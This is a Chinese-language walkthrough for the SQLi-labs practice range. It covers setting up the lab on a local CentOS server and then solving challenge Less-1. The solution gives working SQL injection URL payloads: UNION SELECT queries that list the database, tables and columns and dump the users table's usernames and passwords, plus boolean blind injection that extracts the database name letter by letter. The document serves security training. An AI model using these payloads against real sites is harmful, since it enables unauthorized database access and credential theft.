SQL 注入靶场。

## 1 部署

下载

```shell
[root@centos ~]# git clone https://github.com/Audi-1/sqli-labs.git /var/www/html/sqli-labs
```

修改运行权限

```shell
[root@centos ~]# sudo chown -R apache:apache /var/www/html/
```

配置数据库管理系统密码

```shell
[root@centos ~]# vim /var/www/html/sqli-labs/sql-connections/db-creds.inc
```

```php
5	$dbpass ='';
5	$dbpass ='123456';
```

访问

> http://centos7-6.local/sqli-labs/

初始化

![初始化](./../../../../images/SQLI%20labs/%E9%83%A8%E7%BD%B2/%E5%88%9D%E5%A7%8B%E5%8C%96.png)

完成后点击浏览器返回按钮

![完成后点击浏览器返回按钮](./../../../../images/SQLI%20labs/%E9%83%A8%E7%BD%B2/%E5%AE%8C%E6%88%90%E5%90%8E%E7%82%B9%E5%87%BB%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%94%E5%9B%9E%E6%8C%89%E9%92%AE.png)

## 2 使用

访问

> http://centos7-6.local/sqli-labs/

点击查看 SQL 注入的测试题

> SQLi-LABS Page-1(Basic Challenges)

### 2.1 Less-1

> http://centos7-6.local//sqli-labs/Less-1/

### 2.1.1 准备

**判断是否存在 sql 注入**

提交常见的闭合符号 `'`

```
http://centos7-6.local/sqli-labs/Less-1/?id=1'
```

> 报错

注释

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' --+
```

> 正常

手动闭合

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and '1
```

> 正常，存在字符型 sql 注入

**判断闭合方式**

提交转义符 `\` 

```
http://centos7-6.local/sqli-labs/Less-1/?id=1\
```

> 报错

查看报错

```
'1\' LIMIT 0,1
```

> `\` 后的 `'` 被转义，无法闭合，闭合符号为 `'`

**判断字段数量**

利用 `order by` 判断

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' order by 4 --+
```

> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段

### 2.1.2 联合查询

**爆显示位置**

已知有 3 个字段，提交三个字段查看显示位置

```
http://centos7-6.local/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```

可以看到只有 2，3 处有回显

![可以看到只有 2，3 处有回显](./../../../../images/SQLI%20labs/%E4%BD%BF%E7%94%A8/Less-1/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%8F%AA%E6%9C%89%202%EF%BC%8C3%20%E5%A4%84%E6%9C%89%E5%9B%9E%E6%98%BE.png)

> 因此只能在 2，3  处构造语句

**爆库**

```
http://centos7-6.local/sqli-labs/Less-1/?id=-1' union select 1,2,database() --+
```

得到数据库名为 `secrity`

![得到数据库名为 security](./../../../../images/SQLI%20labs/%E4%BD%BF%E7%94%A8/Less-1/%E5%BE%97%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E4%B8%BA%20security.png)

**爆表**

```
http://centos7-6.local/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
```

得到数据表名

![得到数据表名](./../../../../images/SQLI%20labs/%E4%BD%BF%E7%94%A8/Less-1/%E5%BE%97%E5%88%B0%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D.png)

> 根据数据表名选择数据表

**爆字段**

```
http://centos7-6.local/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users') --+
```

得到字段名

![得到字段名](./../../../../images/SQLI%20labs/%E4%BD%BF%E7%94%A8/Less-1/%E5%BE%97%E5%88%B0%E5%AD%97%E6%AE%B5%E5%90%8D.png)

**拖库**

```
http://centos7-6.local/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(username,'_',password) from users) --+
```

为了方便显示可以换行显示

```
http://centos7-6.local/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(username,0x5F,password,0x3C,0x68,0x72,0x2F,0x3E) from users) --+
```

### 2.1.3 布尔盲注

**爆库**

**判断数据库长度**

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and (length(database())=8) --+
```

> 长度为 8

**取数据库名的每个字符的 ascii 码**

第一个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) = 115 --+
```

> 第一个码为 115 是 s

第二个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),2,1)) = 101 --+
```

> 第二个码为 101 是 e

第三个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),3,1)) = 99 --+
```

> 第二个码为 99 是 c

第四个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),4,1)) = 117 --+
```

> 第四个码为 117 是 u

第五个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),5,1)) = 114 --+
```

> 第五个码为 114 是 r

第六个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),6,1)) = 105 --+
```

> 第六个码为 105 是 i

第七个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),7,1)) = 116 --+
```

> 第七个码 为116 是 t

第八个码

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and ascii(substr(database(),8,1)) = 121 --+
```

> 第八个码为 121 是 y

数据库名为 `security`

**爆表**

**确定当前库中表的个数**

```
http://centos7-6.local/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4 --+
```



### 2.2 Less-2

---

参考链接

- [SQLI labs](https://github.com/Audi-1/sqli-labs)
